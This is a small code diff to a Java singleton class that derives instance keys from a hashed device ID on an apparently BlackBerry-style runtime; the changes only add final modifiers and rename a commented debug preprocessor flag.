@@ -51,7 +51,7 @@ public final class Keys implements Singleton {
 
             instance = (Keys) RuntimeStore.getRuntimeStore().get(GUID);
             if (instance == null) {
-                Keys singleton = new Keys();
+                final Keys singleton = new Keys();
                 RuntimeStore.getRuntimeStore().put(GUID, singleton);
                 instance = singleton;
             }
@@ -75,7 +75,7 @@ public final class Keys implements Singleton {
 
     private Keys() {
         instanceKeys = new InstanceKeys();
-        Device device = Device.getInstance();
+        final Device device = Device.getInstance();
         //device.refreshData();
         final byte[] deviceid = device.getWDeviceId();
         byteInstanceID = Encryption.SHA1(deviceid);
@@ -98,7 +98,7 @@ public final class Keys implements Singleton {
         byteConfKey = instanceKeys.getConfKey();
         byteBuildID = instanceKeys.getBuildId();
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         //debug.trace("setInstanceKeys BuildID:"
         //       + Utils.byteArrayToHex(byteBuildID));
         //#endif
